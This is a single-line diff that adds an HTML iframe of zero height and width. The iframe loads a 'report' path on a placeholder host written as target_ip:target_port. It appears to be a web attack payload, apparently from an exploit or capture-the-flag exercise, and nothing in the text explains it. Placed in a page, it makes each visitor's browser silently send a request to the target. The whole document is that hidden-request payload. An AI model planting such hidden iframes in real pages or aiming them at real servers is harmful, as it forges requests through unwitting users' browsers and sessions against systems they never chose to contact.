@@ -1,0 +1,1 @@
+<iframe src=http://target_ip:target_port/report height="0" width="0"></iframe>
